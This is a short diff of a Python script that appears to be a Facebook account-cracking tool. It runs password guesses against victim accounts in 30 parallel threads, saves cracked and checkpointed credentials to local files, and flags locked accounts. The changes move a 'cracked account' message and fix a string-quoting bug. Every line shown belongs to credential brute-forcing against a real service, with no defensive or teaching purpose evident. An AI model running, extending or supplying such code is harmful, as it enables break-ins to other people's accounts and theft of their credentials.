@@ -129,22 +129,22 @@ def Noob():
         okb = open('save/Noob_Successful.txt', 'a')
         okb.write(victim +" [ NOOB ] "+ line + '\n')
         okb.close()
-                  
+        motion(ccl+"\nCreacked Account In Save File...\n")       
       elif 'www.facebook.com' in q['error_msg']:
         motion( ycl+'\n[NOOB_CP] ' +victim+'  |  '+ycl + line+"\n")
         cps = open('save/Noob_CheckPoint.txt', 'a')
         cps.write(victim +" [ NOOB ] "+ line + '\n')
         cps.close()
+        motion(ccl+"\nCreacked Account In Save File...\n")
       elif q['error_msg']  == "613" or q['error_msg']  == 613:
         motion( ycl+'\n[ LOCKED ] ' +victim+'  |  '+ycl + line+"\n")
         
       else:
         pass
-        print("\033[1;31m[PASSWORD WRONG] '+line+"\n")
+        print("\033[1;31m[PASSWORD WRONG] "+line+"\n")
     except:
       pass
   
   p = ThreadPool(30)
   p.map(main,id)
 Noob()
-motion(ccl+"\nCreacked Account In Save File...\n")
